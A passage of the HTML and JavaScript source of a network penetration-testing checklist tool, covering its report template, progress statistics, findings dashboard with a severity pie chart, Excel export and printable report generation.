                                        <td>${category.priority.charAt(0).toUpperCase() + category.priority.slice(1)}</td>
                                        <td>${catProgress.percent}% (${catProgress.completed}/${catProgress.applicable})</td>
                                        <td>${catFindings}</td>
                                    </tr>
                                    `;
                                }).join('')}
                            </tbody>
                        </table>
                    </section>
                    
                    <section>
                        <h2>Findings Summary</h2>
                        <table class="table">
                            <thead>
                                <tr>
                                    <th>Severity</th>
                                    <th>Count</th>
                                    <th>Description</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td><span class="badge badge-danger">Critical</span></td>
                                    <td>${stats.criticalFindings}</td>
                                    <td>Vulnerabilities that pose an immediate risk to the organization and require urgent remediation</td>
                                </tr>
                                <tr>
                                    <td><span class="badge badge-warning">High</span></td>
                                    <td>${stats.highFindings}</td>
                                    <td>Serious vulnerabilities that could lead to system compromise with moderate effort</td>
                                </tr>
                                <tr>
                                    <td><span class="badge badge-info">Medium</span></td>
                                    <td>${stats.mediumFindings}</td>
                                    <td>Important issues that should be addressed but pose less immediate risk</td>
                                </tr>
                                <tr>
                                    <td><span class="badge badge-success">Low</span></td>
                                    <td>${stats.lowFindings}</td>
                                    <td>Minor security concerns with limited impact or requiring significant effort to exploit</td>
                                </tr>
                                <tr>
                                    <td><strong>Total</strong></td>
                                    <td><strong>${stats.totalFindings}</strong></td>
                                    <td></td>
                                </tr>
                            </tbody>
                        </table>
                    </section>
                    
                    ${stats.totalFindings > 0 ? `
                    <section class="page-break">
                        <h2>Detailed Findings</h2>
                        
                        ${stats.criticalFindings > 0 || stats.highFindings > 0 ? `
                        <h3>Critical & High Risk Findings</h3>
                        ${currentProject.findingDetails.filter(f => f.severity === 'critical' || f.severity === 'high').map((finding, index) => `
                        <div class="finding-card ${finding.severity}">
                            <div class="finding-header">
                                <h4 class="finding-title">${finding.title}</h4>
                                <span class="badge badge-${finding.severity === 'critical' ? 'danger' : 'warning'}">${finding.severity.toUpperCase()}</span>
                            </div>
                            
                            <div class="finding-section">
                                <p class="finding-section-title">Description</p>
                                <p>${finding.description.replace(/\n/g, '<br>')}</p>
                            </div>
                            
                            ${finding.steps ? `
                            <div class="finding-section">
                                <p class="finding-section-title">Steps to Reproduce</p>
                                <p>${finding.steps.replace(/\n/g, '<br>')}</p>
                            </div>
                            ` : ''}
                            
                            ${finding.remediation ? `
                            <div class="finding-section">
                                <p class="finding-section-title">Remediation</p>
                                <p>${finding.remediation.replace(/\n/g, '<br>')}</p>
                            </div>
                            ` : ''}
                            
                            <div class="finding-meta">
                                <p>Category: ${categories[finding.category]?.title || 'Unknown'} | Discovered: ${formatDate(finding.date)}</p>
                            </div>
                        </div>
                        `).join('')}
                        ` : ''}
                        
                        ${stats.mediumFindings > 0 ? `
                        <h3>Medium Risk Findings</h3>
                        ${currentProject.findingDetails.filter(f => f.severity === 'medium').map((finding, index) => `
                        <div class="finding-card ${finding.severity}">
                            <div class="finding-header">
                                <h4 class="finding-title">${finding.title}</h4>
                                <span class="badge badge-info">${finding.severity.toUpperCase()}</span>
                            </div>
                            
                            <div class="finding-section">
                                <p class="finding-section-title">Description</p>
                                <p>${finding.description.replace(/\n/g, '<br>')}</p>
                            </div>
                            
                            ${finding.steps ? `
                            <div class="finding-section">
                                <p class="finding-section-title">Steps to Reproduce</p>
                                <p>${finding.steps.replace(/\n/g, '<br>')}</p>
                            </div>
                            ` : ''}
                            
                            ${finding.remediation ? `
                            <div class="finding-section">
                                <p class="finding-section-title">Remediation</p>
                                <p>${finding.remediation.replace(/\n/g, '<br>')}</p>
                            </div>
                            ` : ''}
                            
                            <div class="finding-meta">
                                <p>Category: ${categories[finding.category]?.title || 'Unknown'} | Discovered: ${formatDate(finding.date)}</p>
                            </div>
                        </div>
                        `).join('')}
                        ` : ''}
                        
                        ${stats.lowFindings > 0 ? `
                        <h3>Low Risk Findings</h3>
                        ${currentProject.findingDetails.filter(f => f.severity === 'low' || f.severity === 'info').map((finding, index) => `
                        <div class="finding-card ${finding.severity}">
                            <div class="finding-header">
                                <h4 class="finding-title">${finding.title}</h4>
                                <span class="badge badge-success">${finding.severity.toUpperCase()}</span>
                            </div>
                            
                            <div class="finding-section">
                                <p class="finding-section-title">Description</p>
                                <p>${finding.description.replace(/\n/g, '<br>')}</p>
                            </div>
                            
                            ${finding.remediation ? `
                            <div class="finding-section">
                                <p class="finding-section-title">Remediation</p>
                                <p>${finding.remediation.replace(/\n/g, '<br>')}</p>
                            </div>
                            ` : ''}
                            
                            <div class="finding-meta">
                                <p>Category: ${categories[finding.category]?.title || 'Unknown'} | Discovered: ${formatDate(finding.date)}</p>
                            </div>
                        </div>
                        `).join('')}
                        ` : ''}
                    </section>
                    ` : ''}
                    
                    ${Object.keys(currentProject.notes || {}).some(key => currentProject.notes[key]?.trim()) ? `
                    <section class="page-break">
                        <h2>Assessment Notes</h2>
                        
                        ${Object.entries(currentProject.notes || {}).filter(([catId, note]) => note?.trim()).map(([catId, note]) => `
                        <div class="card">
                            <h3>${categories[catId]?.title || 'Category Notes'}</h3>
                            <p>${note.replace(/\n/g, '<br>')}</p>
                        </div>
                        `).join('')}
                    </section>
                    ` : ''}
                    
                    <section class="page-break">
                        <h2>Conclusion</h2>
                        <div class="card">
                            <p>The network penetration test conducted on ${currentProject.target || 'the target environment'} has identified several security vulnerabilities of varying severity. It is recommended that remediation efforts be prioritized based on risk level, with critical and high-risk findings addressed immediately.</p>
                            
                            <p>Regular security assessments should be conducted to maintain a strong security posture, especially after significant infrastructure changes or updates.</p>
                        </div>
                    </section>
                </main>
                
                <footer style="text-align: center; padding: 2rem; color: var(--medium-gray); font-size: 0.875rem;">
                    <p>Report generated on ${formatDate(new Date().toISOString())}</p>
                    <p>Network Penetration Testing Checklist Tool</p>
                </footer>
            </body>
            </html>
            `;
            
            // Write to the window
            reportWindow.document.write(reportContent);
            reportWindow.document.close();
            
            // Trigger print dialog after content is loaded
            reportWindow.addEventListener('load', function() {
                if (reportWindow.document.title) {
                    reportWindow.document.title = `Network Pentest Report - ${currentProject.name}`;
                }
            });
        }

        function calculateReportStats() {
            // Initialize counters
            let stats = {
                totalTasks: 0,
                completedTasks: 0,
                naTasks: 0,
                applicableTasks: 0,
                overallPercent: 0,
                
                criticalTasks: { total: 0, completed: 0, na: 0 },
                highTasks: { total: 0, completed: 0, na: 0 },
                mediumTasks: { total: 0, completed: 0, na: 0 },
                
                criticalApplicable: 0,
                criticalCompleted: 0,
                criticalPercent: 0,
                
                highApplicable: 0,
                highCompleted: 0,
                highPercent: 0,
                
                mediumApplicable: 0,
                mediumCompleted: 0,
                mediumPercent: 0,
                
                criticalFindings: 0,
                highFindings: 0,
                mediumFindings: 0,
                lowFindings: 0,
                infoFindings: 0,
                totalFindings: 0,
                
                categoryProgress: {},
                findingsByCategory: {}
            };
            
            // Count findings by severity
            if (currentProject.findingDetails) {
                stats.criticalFindings = currentProject.findingDetails.filter(f => f.severity === 'critical').length;
                stats.highFindings = currentProject.findingDetails.filter(f => f.severity === 'high').length;
                stats.mediumFindings = currentProject.findingDetails.filter(f => f.severity === 'medium').length;
                stats.lowFindings = currentProject.findingDetails.filter(f => f.severity === 'low').length;
                stats.infoFindings = currentProject.findingDetails.filter(f => f.severity === 'info').length;
                stats.totalFindings = currentProject.findingDetails.length;
                
                // Group findings by category
                stats.findingsByCategory = {};
                Object.keys(categories).forEach(catId => {
                    stats.findingsByCategory[catId] = currentProject.findingDetails.filter(f => f.category === catId);
                });
            }
            
            // Calculate task completion stats
            Object.entries(categories).forEach(([catId, category]) => {
                if (!category.checklistItems) return;
                
                const priority = category.priority;
                let catStats = { total: 0, completed: 0, na: 0, applicable: 0, percent: 0 };
                
                category.checklistItems.forEach(item => {
                    if (!item.id) return;
                    
                    stats.totalTasks++;
                    catStats.total++;
                    
                    // Track by priority
                    if (priority === 'critical') stats.criticalTasks.total++;
                    else if (priority === 'high') stats.highTasks.total++;
                    else if (priority === 'medium') stats.mediumTasks.total++;
                    
                    const status = currentProject.taskStatus?.[item.id] || TASK_STATUS.NOT_TESTED;
                    
                    if (status === TASK_STATUS.PASSED) {
                        stats.completedTasks++;
                        catStats.completed++;
                        
                        // Track completed by priority
                        if (priority === 'critical') stats.criticalTasks.completed++;
                        else if (priority === 'high') stats.highTasks.completed++;
                        else if (priority === 'medium') stats.mediumTasks.completed++;
                    } 
                    else if (status === TASK_STATUS.NA) {
                        stats.naTasks++;
                        catStats.na++;
                        
                        // Track N/A by priority
                        if (priority === 'critical') stats.criticalTasks.na++;
                        else if (priority === 'high') stats.highTasks.na++;
                        else if (priority === 'medium') stats.mediumTasks.na++;
                    }
                });
                
                // Calculate category stats
                catStats.applicable = catStats.total - catStats.na;
                catStats.percent = catStats.applicable > 0 ? Math.round((catStats.completed / catStats.applicable) * 100) : 0;
                stats.categoryProgress[catId] = catStats;
            });
            
            // Calculate overall progress
            stats.applicableTasks = stats.totalTasks - stats.naTasks;
            stats.overallPercent = stats.applicableTasks > 0 ? Math.round((stats.completedTasks / stats.applicableTasks) * 100) : 0;
            
            // Calculate priority-specific progress
            stats.criticalApplicable = stats.criticalTasks.total - stats.criticalTasks.na;
            stats.criticalCompleted = stats.criticalTasks.completed;
            stats.criticalPercent = stats.criticalApplicable > 0 ? Math.round((stats.criticalCompleted / stats.criticalApplicable) * 100) : 0;
            
            stats.highApplicable = stats.highTasks.total - stats.highTasks.na;
            stats.highCompleted = stats.highTasks.completed;
            stats.highPercent = stats.highApplicable > 0 ? Math.round((stats.highCompleted / stats.highApplicable) * 100) : 0;
            
            stats.mediumApplicable = stats.mediumTasks.total - stats.mediumTasks.na;
            stats.mediumCompleted = stats.mediumTasks.completed;
            stats.mediumPercent = stats.mediumApplicable > 0 ? Math.round((stats.mediumCompleted / stats.mediumApplicable) * 100) : 0;
            
            return stats;
        }
    </script>
<button id="btn-dashboard" class="btn btn-primary">
    <i class="fas fa-chart-line"></i>
    <span>Dashboard</span>
</button>

<script>
document.addEventListener('DOMContentLoaded', function() {
    // Add dashboard button functionality
    document.getElementById('btn-dashboard')?.addEventListener('click', function() {
        openDashboard();
    });
});

// Dashboard initialization
function openDashboard() {
    // Load required libraries
    Promise.all([
        loadScript('https://cdn.jsdelivr.net/npm/chart.js@3.7.1/dist/chart.min.js'),
        loadScript('https://cdn.jsdelivr.net/npm/xlsx@0.18.5/dist/xlsx.full.min.js')
    ]).then(() => {
        console.log('Dashboard libraries loaded');
        showDashboard();
    }).catch(error => {
        console.error('Error loading dashboard libraries:', error);
        showToast('Failed to load dashboard components', 'error');
    });
}

// Helper function to load external scripts
function loadScript(src) {
    return new Promise((resolve, reject) => {
        // Check if already loaded
        if (document.querySelector(`script[src="${src}"]`)) {
            resolve();
            return;
        }
        
        const script = document.createElement('script');
        script.src = src;
        script.onload = resolve;
        script.onerror = reject;
        document.head.appendChild(script);
    });
}

// Show the dashboard modal with content
function showDashboard() {
    // Get direct access to the main variables
    // This is the key fix - we're directly accessing currentProject from the global scope
    const currentProject = window.currentProject || {};
    const categories = window.categories || {};
    
    // Verify we have access to the required data
    if (!currentProject || !categories) {
        showToast('Cannot access project data', 'error');
        return;
    }

    // Create dashboard modal
    const dashboardModal = document.createElement('div');
    dashboardModal.id = 'dashboard-modal';
    dashboardModal.className = 'modal-overlay active';
    
    // Build simplified dashboard content
    dashboardModal.innerHTML = `
        <div class="modal" style="max-width: 90%; height: 90%; max-height: 90vh;">
            <div class="modal-header">
                <h3 class="modal-title">Network Security Assessment Dashboard</h3>
                <button class="modal-close" data-dismiss="modal">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="modal-body" style="padding: 20px; overflow-y: auto;">
                <div class="dashboard-metrics-row">
                    <div class="metric-card">
                        <div class="metric-content">
                            <h4>Project Details</h4>
                            <p><strong>Name:</strong> ${currentProject.name || 'Unnamed Project'}</p>
                            <p><strong>Target:</strong> ${currentProject.target || 'N/A'}</p>
                            <p><strong>Date:</strong> ${formatDate(currentProject.date)}</p>
                        </div>
                    </div>
                    <div class="metric-card">
                        <div class="metric-content">
                            <h4>Findings Summary</h4>
                            <p><strong>Total Findings:</strong> ${(currentProject.findingDetails || []).length}</p>
                            <p><strong>Critical:</strong> ${(currentProject.findingDetails || []).filter(f => f.severity === 'critical').length}</p>
                            <p><strong>High:</strong> ${(currentProject.findingDetails || []).filter(f => f.severity === 'high').length}</p>
                        </div>
                    </div>
                </div>
                
                <div style="margin-top: 20px; display: flex; gap: 20px; flex-wrap: wrap;">
                    <div style="flex: 1; min-width: 300px; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 6px rgba(0,0,0,0.1);">
                        <h4>Findings by Severity</h4>
                        <div style="height: 250px;">
                            <canvas id="findingsSeverityChart"></canvas>
                        </div>
                    </div>
                    
                    <div style="flex: 1; min-width: 300px; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 6px rgba(0,0,0,0.1);">
                        <h4>Export Options</h4>
                        <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 20px;">
                            <button id="export-excel" class="btn btn-primary">
                                <i class="fas fa-file-excel"></i> Export to Excel
                            </button>
                            <button id="export-report" class="btn btn-danger">
                                <i class="fas fa-file-pdf"></i> Generate Report
                            </button>
                        </div>
                    </div>
                </div>
                
                <div style="margin-top: 20px; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 6px rgba(0,0,0,0.1);">
                    <h4>Findings List</h4>
                    <div id="findings-table-container" style="overflow-x: auto;">
                        <table style="width: 100%; border-collapse: collapse;">
                            <thead>
                                <tr>
                                    <th style="text-align: left; padding: 10px; border-bottom: 1px solid #eee;">Title</th>
                                    <th style="text-align: left; padding: 10px; border-bottom: 1px solid #eee;">Category</th>
                                    <th style="text-align: left; padding: 10px; border-bottom: 1px solid #eee;">Severity</th>
                                    <th style="text-align: left; padding: 10px; border-bottom: 1px solid #eee;">Date Found</th>
                                </tr>
                            </thead>
                            <tbody id="findings-tbody">
                                <!-- Findings will be populated here -->
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-primary" data-dismiss="modal">Close Dashboard</button>
            </div>
        </div>
    `;
    
    // Add to document
    document.body.appendChild(dashboardModal);
    
    // Set up event listeners
    dashboardModal.querySelector('.modal-close, [data-dismiss="modal"]').addEventListener('click', function() {
        document.body.removeChild(dashboardModal);
    });
    
    // Create findings severity chart
    createFindingsSeverityChart(currentProject);
    
    // Populate findings table
    populateFindingsTable(currentProject, categories);
    
    // Add export button event listeners
    dashboardModal.querySelector('#export-excel')?.addEventListener('click', function() {
        exportToExcel(currentProject, categories);
    });
    
    dashboardModal.querySelector('#export-report')?.addEventListener('click', function() {
        generateReport(currentProject, categories);
    });
}

// Create findings severity chart
function createFindingsSeverityChart(currentProject) {
    const ctx = document.getElementById('findingsSeverityChart');
    if (!ctx || typeof Chart === 'undefined') return;
    
    // Count findings by severity
    const findings = currentProject.findingDetails || [];
    const criticalCount = findings.filter(f => f.severity === 'critical').length;
    const highCount = findings.filter(f => f.severity === 'high').length;
    const mediumCount = findings.filter(f => f.severity === 'medium').length;
    const lowCount = findings.filter(f => f.severity === 'low').length;
    const infoCount = findings.filter(f => f.severity === 'info').length;
    
    // Chart data
    const data = {
        labels: ['Critical', 'High', 'Medium', 'Low', 'Info'],
        datasets: [{
            data: [criticalCount, highCount, mediumCount, lowCount, infoCount],
            backgroundColor: [
                '#dc3545',
                '#ff9500',
                '#ffce00',
                '#28a745',
                '#3498db'
            ],
            borderWidth: 1
        }]
    };
    
    // Chart options
    const options = {
        responsive: true,
        maintainAspectRatio: false,
        plugins: {
            legend: {
                position: 'right',
            }
        }
    };
    
    // Create chart
    try {
        new Chart(ctx, {
            type: 'pie',
            data: data,
            options: options
        });
    } catch (error) {
        console.error('Error creating findings severity chart:', error);
    }
}

// Populate findings table
function populateFindingsTable(currentProject, categories) {
    const tbody = document.getElementById('findings-tbody');
    if (!tbody) return;
    
    const findings = currentProject.findingDetails || [];
    
    if (findings.length === 0) {
        tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; padding: 10px;">No findings recorded</td></tr>';
        return;
    }
    
    // Sort findings by severity (critical first)
    const sortedFindings = [...findings].sort((a, b) => {
        const severityOrder = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
        return severityOrder[a.severity] - severityOrder[b.severity];
    });
    
    // Clear table
    tbody.innerHTML = '';
    
    // Add findings to table
    sortedFindings.forEach(finding => {
        const row = document.createElement('tr');
        
        // Determine severity class
        let severityClass = '';
        let severityText = finding.severity.charAt(0).toUpperCase() + finding.severity.slice(1);
        
        if (finding.severity === 'critical') severityClass = 'style="color: #dc3545;"';
        else if (finding.severity === 'high') severityClass = 'style="color: #ff9500;"';
        else if (finding.severity === 'medium') severityClass = 'style="color: #ffce00;"';
        else severityClass = 'style="color: #28a745;"';
        
        row.innerHTML = `
            <td style="padding: 10px; border-bottom: 1px solid #eee;">${finding.title || 'Untitled'}</td>
            <td style="padding: 10px; border-bottom: 1px solid #eee;">${categories[finding.category]?.title || 'Unknown'}</td>
            <td ${severityClass} style="padding: 10px; border-bottom: 1px solid #eee;">${severityText}</td>
            <td style="padding: 10px; border-bottom: 1px solid #eee;">${formatDate(finding.date)}</td>
        `;
        
        tbody.appendChild(row);
    });
}

// Export to Excel function
function exportToExcel(currentProject, categories) {
    if (typeof XLSX === 'undefined') {
        showToast('Excel export library not loaded', 'error');
        return;
    }
    
    try {
        // Create a workbook
        const wb = XLSX.utils.book_new();
        
        // Add findings sheet
        if (currentProject.findingDetails && currentProject.findingDetails.length > 0) {
            const findingsData = [
                ['Title', 'Category', 'Severity', 'Date Found', 'Description', 'Steps to Reproduce', 'Remediation']
            ];
            
            currentProject.findingDetails.forEach(finding => {
                findingsData.push([
                    finding.title || '',
                    categories[finding.category]?.title || 'Unknown',
                    finding.severity.charAt(0).toUpperCase() + finding.severity.slice(1),
                    finding.date ? new Date(finding.date).toLocaleDateString() : '',
                    finding.description || '',
                    finding.steps || '',
                    finding.remediation || ''
                ]);
            });
            
            const ws = XLSX.utils.aoa_to_sheet(findingsData);
            XLSX.utils.book_append_sheet(wb, ws, 'Findings');
        }
        
        // Add project info sheet
        const projectData = [
            ['Network Penetration Test Report'],
            [''],
            ['Project Name', currentProject.name || 'N/A'],
            ['Target', currentProject.target || 'N/A'],
            ['Date', currentProject.date ? new Date(currentProject.date).toLocaleDateString() : 'N/A'],
            ['Tester', currentProject.tester || 'N/A'],
            ['Scope', currentProject.scope || 'N/A'],
            ['Generated', new Date().toLocaleDateString()]
        ];
        
        const ws = XLSX.utils.aoa_to_sheet(projectData);
        XLSX.utils.book_append_sheet(wb, ws, 'Project Info');
        
        // Export the workbook
        const fileName = `netpentest_${(currentProject.name || 'report').replace(/[^a-z0-9]/gi, '_').toLowerCase()}_${new Date().toISOString().slice(0, 10)}.xlsx`;
        XLSX.writeFile(wb, fileName);
        
        showToast('Excel report exported successfully', 'success');
    } catch (error) {
        console.error('Error exporting to Excel:', error);
        showToast('Failed to export Excel report', 'error');
    }
}

// Generate report function
function generateReport(currentProject, categories) {
    try {
        // Create a print-friendly view
        const printWindow = window.open('', '_blank');
        
        if (!printWindow) {
            showToast('Popup blocked. Please allow popups for reporting.', 'error');
            return;
        }
        
        // Get findings counts
        const findings = currentProject.findingDetails || [];
        const criticalCount = findings.filter(f => f.severity === 'critical').length;
        const highCount = findings.filter(f => f.severity === 'high').length;
        const mediumCount = findings.filter(f => f.severity === 'medium').length;
        const lowCount = findings.filter(f => f.severity === 'low').length;
        const infoCount = findings.filter(f => f.severity === 'info').length;
        
        // Generate HTML for the report
        const reportContent = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Network Penetration Test Report</title>
            <style>
                body { font-family: Arial, sans-serif; padding: 20px; line-height: 1.6; }
                h1 { color: #051937; }
                h2 { color: #2a4f91; border-bottom: 1px solid #e9ecef; padding-bottom: 10px; margin-top: 30px; }
                table { width: 100%; border-collapse: collapse; margin: 20px 0; }
                th, td { padding: 10px; text-align: left; border-bottom: 1px solid #e9ecef; }
                th { background-color: #f8f9fa; }
                .critical { color: #dc3545; }
                .high { color: #ff9500; }
                .medium { color: #ffce00; }
                .low { color: #28a745; }
                @media print { body { padding: 0; } }
            </style>
        </head>
        <body>
            <h1>Network Penetration Test Report</h1>
            <p><strong>Project:</strong> ${currentProject.name || 'Unnamed Project'}</p>
            <p><strong>Target:</strong> ${currentProject.target || 'N/A'}</p>
            <p><strong>Date:</strong> ${new Date().toLocaleDateString()}</p>
            
            <h2>Executive Summary</h2>
            <p>This report presents the findings of a network penetration test conducted on ${currentProject.target || 'the target environment'}.</p>
            
            <h2>Findings Summary</h2>
            <table>
                <tr>
                    <th>Severity</th>
                    <th>Count</th>
                </tr>
                <tr>
                    <td class="critical">Critical</td>
                    <td>${criticalCount}</td>
                </tr>
                <tr>
                    <td class="high">High</td>
                    <td>${highCount}</td>
                </tr>
                <tr>
                    <td class="medium">Medium</td>
                    <td>${mediumCount}</td>
                </tr>
                <tr>
                    <td class="low">Low</td>
                    <td>${lowCount + infoCount}</td>
                </tr>
                <tr>
                    <td><strong>Total</strong></td>
                    <td><strong>${findings.length}</strong></td>
                </tr>
            </table>
            
            <h2>Detailed Findings</h2>
            ${findings.length > 0 ? `
            <table>
                <tr>
                    <th>Title</th>
                    <th>Category</th>
                    <th>Severity</th>
                    <th>Description</th>
                </tr>
                ${findings.map(finding => `
                <tr>
                    <td>${finding.title || 'Untitled'}</td>
                    <td>${categories[finding.category]?.title || 'Unknown'}</td>
                    <td class="${finding.severity}">${finding.severity.charAt(0).toUpperCase() + finding.severity.slice(1)}</td>
                    <td>${(finding.description || '').substring(0, 100)}${finding.description?.length > 100 ? '...' : ''}</td>
                </tr>
                `).join('')}
            </table>
            ` : '<p>No findings have been recorded for this project.</p>'}
            
            <h2>Remediation Recommendations</h2>
            ${findings.filter(f => f.remediation).length > 0 ? `
            <ul>
                ${findings.filter(f => f.remediation).map(finding => `
                <li><strong>${finding.title}</strong>: ${finding.remediation.substring(0, 200)}${finding.remediation.length > 200 ? '...' : ''}</li>
                `).join('')}
            </ul>
            ` : '<p>No specific remediation recommendations available yet.</p>'}
        </body>
        </html>
        `;
        
        // Write to the window and trigger print
        printWindow.document.write(reportContent);
        printWindow.document.close();
        
        // Wait for content to load then print
        printWindow.addEventListener('load', function() {
            printWindow.print();
        });
        
        showToast('Report generated successfully', 'success');
    } catch (error) {
        console.error('Error generating report:', error);
        showToast('Failed to generate report', 'error');
    }
}

// Helper function to format dates
function formatDate(dateString) {
    if (!dateString) return 'N/A';
    
    try {
        const date = new Date(dateString);
        return date.toLocaleDateString();
    } catch (e) {
        return dateString;
    }
}
</script>

<style>
/* Basic dashboard styles */
.metric-card {
    background-color: white;
    border-radius: 8px;
    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.08);
    padding: 20px;
    flex: 1;
    min-width: 180px;
    transition: transform 0.2s;
}

.metric-card:hover {
    transform: translateY(-3px);
}

.dashboard-metrics-row {
    display: flex;
    flex-wrap: wrap;
    gap: 15px;
    margin-bottom: 20px;
}

@media (max-width: 768px) {
    .dashboard-metrics-row {
        flex-direction: column;
    }
}
</style>
<script src="
https://cdn.jsdelivr.net/npm/echarts@5.6.0/dist/echarts.min.js
"></script>

</body></html>